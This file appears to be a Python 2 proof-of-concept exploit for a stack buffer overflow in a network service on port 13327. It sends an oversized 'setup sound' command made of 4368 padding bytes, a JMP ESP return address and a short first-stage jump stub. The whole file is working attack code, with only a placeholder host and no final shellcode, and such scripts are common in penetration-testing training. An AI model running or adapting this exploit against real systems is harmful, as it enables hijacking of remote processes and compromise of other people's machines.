#!/usr/bin/python
# This is used to redirect the ESP pointer to the beginning of the input buffer.
import socket

host = "<attacker IP>"

padding = "\x41" * 4368
eip = "\x96\x45\x13\x08" # the memory address for the JMP ESP instruction
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90" # 83C00C for "add eax,12" and FFE0 for "jmp eax" and 2 NOP for padding to maintain correct buffer length

buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*}Sending evil buffer…"

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close

print "[*]Payload Sent !"
